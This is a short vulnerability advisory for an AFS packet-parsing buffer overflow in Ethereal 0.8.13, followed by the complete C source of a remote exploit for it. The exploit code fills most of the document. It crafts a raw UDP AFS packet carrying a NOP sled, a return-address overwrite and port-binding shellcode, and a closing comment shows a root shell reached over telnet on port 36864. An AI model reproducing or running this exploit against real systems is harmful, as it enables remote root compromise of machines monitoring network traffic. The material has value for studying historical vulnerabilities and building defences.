source : http://www.securityfocus.com/bid/1972/info

Ethereal is a network auditing utility originally written by Gerald Combs. A problem exists in the Ethereal package which can allow a remote user to execute code.

The problem exists in the AFS packet parsing routine. An algorithm string scans the contents of a packet into a predefined buffer, not checking to see if the size of the string exceeds the buffer size. It is therefore possible to overwrite other values on the stack including the return address. This problem makes it possible for a malicious user to execute code with a custom crafted packet.


/*
Name: Ethereal 0.8.13 AFS ACL buffer overflow exploit
Author:
 http://hacksware.com
 mat@hacksware.com
 gcc -o sbo_ethereal sbo_ethereal.c
Usage:
 ./sbo_ethereal <dest_addr>
   dest_addr is the destination address of the host which traffic the victim host running ethereal program can monitor.

Greetz to: Mastrippolito,Trino,s3ung,gumpjin,w00we_mc2,jgotts,luciano,etc...

I used some network codes from synk4.c.
*/

#include <signal.h>
#include <stdio.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/time.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <linux/tcp.h>
#include <linux/udp.h>

/*shell code from http://www.hack.co.za/c0de/linux-x86/portshell.c*/
/* port binding shell on 36864*/

/*
 *  Linux/x86
 *  TCP/36864 portshell (old, could be optimized further)
 */

char c0de[] =
/* main: */
"\xeb\x72"                                /* jmp callz               */
/* start: */
"\x5e"                                    /* popl %esi               */

  /* socket() */
"\x29\xc0"                                /* subl %eax, %eax         */
"\x89\x46\x10"                            /* movl %eax, 0x10(%esi)   */
"\x40"                                    /* incl %eax               */
"\x89\xc3"                                /* movl %eax, %ebx         */
"\x89\x46\x0c"                            /* movl %eax, 0x0c(%esi)   */
"\x40"                                    /* incl %eax               */
"\x89\x46\x08"                            /* movl %eax, 0x08(%esi)   */
"\x8d\x4e\x08"                            /* leal 0x08(%esi), %ecx   */
"\xb0\x66"                                /* movb $0x66, %al         */
"\xcd\x80"                                /* int $0x80               */

  /* bind() */
"\x43"                                    /* incl %ebx               */
"\xc6\x46\x10\x10"                        /* movb $0x10, 0x10(%esi)  */
"\x66\x89\x5e\x14"                        /* movw %bx, 0x14(%esi)    */
"\x88\x46\x08"                            /* movb %al, 0x08(%esi)    */
"\x29\xc0"                                /* subl %eax, %eax         */
"\x89\xc2"                                /* movl %eax, %edx         */
"\x89\x46\x18"                            /* movl %eax, 0x18(%esi)   */
"\xb0\x90"                                /* movb $0x90, %al         */
"\x66\x89\x46\x16"                        /* movw %ax, 0x16(%esi)    */
"\x8d\x4e\x14"                            /* leal 0x14(%esi), %ecx   */
"\x89\x4e\x0c"                            /* movl %ecx, 0x0c(%esi)   */
"\x8d\x4e\x08"                            /* leal 0x08(%esi), %ecx   */
"\xb0\x66"                                /* movb $0x66, %al         */
"\xcd\x80"                                /* int $0x80               */

  /* listen() */
"\x89\x5e\x0c"                            /* movl %ebx, 0x0c(%esi)   */
"\x43"                                    /* incl %ebx               */
"\x43"                                    /* incl %ebx               */
"\xb0\x66"                                /* movb $0x66, %al         */
"\xcd\x80"                                /* int $0x80               */

  /* accept() */
"\x89\x56\x0c"                            /* movl %edx, 0x0c(%esi)   */
"\x89\x56\x10"                            /* movl %edx, 0x10(%esi)   */
"\xb0\x66"                                /* movb $0x66, %al         */
"\x43"                                    /* incl %ebx               */
"\xcd\x80"                                /* int $0x80               */

  /* dup2(s, 0); dup2(s, 1); dup2(s, 2); */
"\x86\xc3"                                /* xchgb %al, %bl          */
"\xb0\x3f"                                /* movb $0x3f, %al         */
"\x29\xc9"                                /* subl %ecx, %ecx         */
"\xcd\x80"                                /* int $0x80               */
"\xb0\x3f"                                /* movb $0x3f, %al         */
"\x41"                                    /* incl %ecx               */
"\xcd\x80"                                /* int $0x80               */
"\xb0\x3f"                                /* movb $0x3f, %al         */
"\x41"                                    /* incl %ecx               */
"\xcd\x80"                                /* int $0x80               */

  /* execve() */
"\x88\x56\x07"                            /* movb %dl, 0x07(%esi)    */
"\x89\x76\x0c"                            /* movl %esi, 0x0c(%esi)   */
"\x87\xf3"                                /* xchgl %esi, %ebx        */
"\x8d\x4b\x0c"                            /* leal 0x0c(%ebx), %ecx   */
"\xb0\x0b"                                /* movb $0x0b, %al         */
"\xcd\x80"                                /* int $0x80               */

/* callz: */
"\xe8\x89\xff\xff\xff"                    /* call start              */
"/bin/sh";

/*                    www.hack.co.za           [7 August 2000]*/
unsigned long getaddr (char *name)
{
  struct hostent *hep;

  hep = gethostbyname (name);
  if (!hep)
    {
      fprintf (stderr, "Unknown host %s\n", name);
      exit (1);
    }
  return *(unsigned long *) hep->h_addr;
}

unsigned short
ip_sum (u_short * addr, int len)
{
  register int nleft = len;
  register u_short *w = addr;
  register int sum = 0;
  u_short answer = 0;

  while (nleft > 1)
    {
      sum += *w++;
      nleft -= 2;
    }
  if (nleft == 1)
    {
      *(u_char *) (&answer) = *(u_char *) w;
      sum += answer;
    }
  sum = (sum >> 16) + (sum & 0xffff);   /* add hi 16 to low 16 */
  sum += (sum >> 16);           /* add carry */
  answer = ~sum;                /* truncate to 16 bits */
  return (answer);
}

void send_udp_segment (int raw_socket,struct iphdr *iphdr_p, struct udphdr *udphdr_p, char *data, int dlen)
{
  char buf[65536];
  struct
  {                             /* rfc 793 udp pseudo-header */
    unsigned long saddr, daddr;
    char mbz;
    char ptcl;
    unsigned short udpl;
  }
  ph;

  struct sockaddr_in sin;

  ph.saddr = iphdr_p->saddr;
  ph.daddr = iphdr_p->daddr;
  ph.mbz = 0;
  ph.ptcl = IPPROTO_TCP;
  ph.udpl = htons (sizeof (*udphdr_p) + dlen);

  memcpy (buf, &ph, sizeof (ph));
  memcpy (buf + sizeof (ph), udphdr_p, sizeof (*udphdr_p));
  memcpy (buf + sizeof (ph) + sizeof (*udphdr_p), data, dlen);
  memset (buf + sizeof (ph) + sizeof (*udphdr_p) + dlen, 0, 4);
  udphdr_p->check = ip_sum (buf, (sizeof (ph) + sizeof (*udphdr_p) + dlen + 1) & ~1);

  memcpy (buf, iphdr_p,4*iphdr_p->ihl);
  memcpy (buf + 4 * iphdr_p->ihl, udphdr_p, sizeof (*udphdr_p));
  memcpy (buf + 4 * iphdr_p->ihl + sizeof (*udphdr_p), data, dlen);
  memset (buf + 4 * iphdr_p->ihl + sizeof (*udphdr_p) + dlen, 0, 4);

  iphdr_p->check = ip_sum (buf, (4 * iphdr_p->ihl + sizeof (*udphdr_p) + dlen + 1) & ~1);
  memcpy (buf, iphdr_p, 4 * iphdr_p->ihl);

  sin.sin_family = AF_INET;
  sin.sin_port = udphdr_p->dest;
  sin.sin_addr.s_addr = iphdr_p->daddr;

  if (sendto(raw_socket, buf, 4 * iphdr_p->ihl + sizeof (*udphdr_p) + dlen, 0, &sin,sizeof (sin)) < 0)
    {
      printf ("Error sending syn packet.\n");
      perror ("");
      exit (1);
    }
}

unsigned long
send_udp_afs_data (int raw_socket,unsigned long src_addr, unsigned short src_port,
            unsigned long dst_addr, unsigned short dst_port)
{
  struct iphdr iphdr_d;
  struct udphdr udphdr_d;

  typedef unsigned int guint32;
  typedef unsigned short guint16;
/*header from ethereal*/
struct rx_header {
        guint32 epoch;
        guint32 cid;
        guint32 callNumber;
        guint32 seq;
        guint32 serial;
        u_char type;
#define RX_PACKET_TYPE_DATA             1
#define RX_PACKET_TYPE_ACK              2
#define RX_PACKET_TYPE_BUSY             3
#define RX_PACKET_TYPE_ABORT            4
#define RX_PACKET_TYPE_ACKALL           5
#define RX_PACKET_TYPE_CHALLENGE        6
#define RX_PACKET_TYPE_RESPONSE         7
#define RX_PACKET_TYPE_DEBUG            8
#define RX_PACKET_TYPE_PARAMS           9
#define RX_PACKET_TYPE_VERSION          13
        u_char flags;
#define RX_CLIENT_INITIATED 1
#define RX_REQUEST_ACK 2
#define RX_LAST_PACKET 4
#define RX_MORE_PACKETS 8
#define RX_FREE_PACKET 16
        u_char userStatus;
        u_char securityIndex;
        guint16 spare;                  /* How clever: even though the AFS */
        guint16 serviceId;              /* header files indicate that the */
};                                      /* serviceId is first, it's really */
                                        /* encoded _after_ the spare field */
                                        /* I wasted a day figuring that out! */
  struct rx_header rx_header_d;
  int afs_data_len;
  char *afs_data;
  int data_len;
  char *data_buffer;


  iphdr_d.version = 4;
  iphdr_d.ihl = 5;
  iphdr_d.tos = 0;
  iphdr_d.tot_len = sizeof (iphdr_d)+sizeof(udphdr_d);
  iphdr_d.id = htons(545);
  iphdr_d.frag_off = 0;
  iphdr_d.ttl = 90;
  iphdr_d.protocol = IPPROTO_UDP;
  iphdr_d.check = 0;
  iphdr_d.saddr = src_addr;
  iphdr_d.daddr = dst_addr;

  udphdr_d.source = htons (src_port);
  udphdr_d.dest = htons (dst_port);
  udphdr_d.len = 2;
  udphdr_d.check = 0;

  rx_header_d.epoch=htonl(0);
  rx_header_d.cid=htonl(1);
  rx_header_d.callNumber=htonl(2);
  rx_header_d.seq=htonl(3);
  rx_header_d.serial=htonl(4);

  rx_header_d.type=RX_PACKET_TYPE_DATA;
  rx_header_d.flags=RX_CLIENT_INITIATED;
  rx_header_d.userStatus=6;
  rx_header_d.securityIndex=7;
  rx_header_d.spare=htons(8);
  rx_header_d.serviceId=htons(9);

  {
#define DATA_SIZE 600 //Data portion size
   u_long datasize=htonl(DATA_SIZE);
   afs_data_len=4*5+DATA_SIZE;
   /*
     UINT opcode
     UINT volume
     UINT vnode
     UINT uniqifier
     UINT datasize

    data section
     pos(%d) neg (%d)
     pos times*( user(%s), &acl(%d))
     neg times*( user(%s), &acl(%d))
   */

   afs_data=(char *)calloc(1,afs_data_len);
   if(afs_data)
   {
    u_long opcode=htonl(134);
    int i;
    int cur_pos;
#define CODE_LEN 300
    char code_buf[CODE_LEN];
    unsigned long esp=0x81c6f02;
#define RET_ADDR_POS 150
    int offset=RET_ADDR_POS+20;

    for(i=0;i<=RET_ADDR_POS;i+=4)
       *(long *)&code_buf[i]=(unsigned long)esp+offset;
    memset(code_buf+RET_ADDR_POS,0x90,CODE_LEN-RET_ADDR_POS); //insert NOP CODES
    memcpy(code_buf+CODE_LEN-strlen(c0de),c0de,strlen(c0de));

    memcpy(afs_data,(char *)&opcode,sizeof(u_long));
    memcpy(afs_data+4*4,(char *)&datasize,sizeof(u_long));
    sprintf(afs_data+4*5,"%d %d %s %d",1,1,"hi",1);

    cur_pos=4*5+strlen(afs_data+4*5);
    memcpy(afs_data+cur_pos,code_buf,CODE_LEN);
    sprintf(afs_data+cur_pos+CODE_LEN," %d",1);

    data_len=sizeof(struct rx_header)+afs_data_len;
    data_buffer=(char *)calloc(1,data_len);
    if(data_buffer)
    {
     memcpy(data_buffer,(char *)&rx_header_d,sizeof(struct rx_header));
     memcpy(data_buffer+sizeof(struct rx_header),afs_data,afs_data_len);
     send_udp_segment (raw_socket,&iphdr_d,&udphdr_d,data_buffer,data_len);
     free(data_buffer);
    }
    free(afs_data);
   }
  }
}

main (int argc, char **argv)
{
  u_short src_port, dst_port;
  unsigned long src_addr, dst_addr;
  int raw_socket;

  if(argc<2)
  {
   printf("%s dst_addr\n",argv[0]);
   fflush(stdout);
   exit(1);
  }
  src_addr = getaddr ("1.1.1.1");
  dst_addr = getaddr (argv[1]);
  src_port = 10;
  dst_port = 7000;

  raw_socket = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
  if (raw_socket < 0)
    {
      perror ("socket (raw)");
      exit (1);
    }

  send_udp_afs_data (raw_socket,src_addr, src_port, dst_addr, dst_port);
}

/*
 If the attack was successful you can get in the system like this.
matt:~# telnet victim 36864
Trying 127.0.0.1...
Connected to localhost.
Escape character is '^]'.
id;
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)


*/
